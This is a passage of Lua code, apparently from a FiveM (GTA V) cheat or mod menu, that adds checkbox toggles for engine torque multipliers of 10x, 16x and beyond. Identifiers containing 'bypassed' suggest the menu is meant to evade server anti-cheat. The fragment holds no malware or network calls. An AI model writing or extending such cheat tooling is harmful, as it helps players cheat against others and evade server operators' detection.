                    elseif felipebypassedmesquita.CheckBox("Engine ~g~Torque ~s~Booster ~g~10x", t10x, function(enabled)
                      t2x = Pryorbypessed2
                      t4x = Pryorbypessed2
                      t10x = enabled
                      t16x = Pryorbypessed2
                      txd = Pryorbypessed2
                      tbxd = Pryorbypessed2
                      end) then
                      elseif felipebypassedmesquita.CheckBox("Engine ~g~Torque ~s~Booster ~g~16x", t16x, function(enabled)
                        t2x = Pryorbypessed2
                        t4x = Pryorbypessed2
                        t10x = Pryorbypessed2
                        t16x = enabled
                        txd = Pryorbypessed2
                        tbxd = Pryorbypessed2
                        end) then
                        elseif felipebypassedmesquita.CheckBox("Engine ~g~Torque ~s~Booster ~y~XD", txd, function(enabled)
                          t2x = Pryorbypessed2
                          t4x = Pryorbypessed2
                          t10x = Pryorbypessed2
                          t16x = Pryorbypessed2
                          txd = enabled
                          tbxd = Pryorbypessed2
                          end) then
                          elseif felipebypassedmesquita.CheckBox("Engine ~g~Torque ~s~Booster ~y~BIG   :)", tbxd, function(enabled)
                            t2x = Pryorbypessed2
                            t4x = Pryorbypessed2
                            t10x = Pryorbypessed2
                            t16x = Pryorbypessed2
                            txd = Pryorbypessed2
                            tbxd = enabled
                            end) then

                            end
                            felipebypassedmesquita.Display()
                          end
                          Citizen.Wait(0)
                        end
                        end)
          
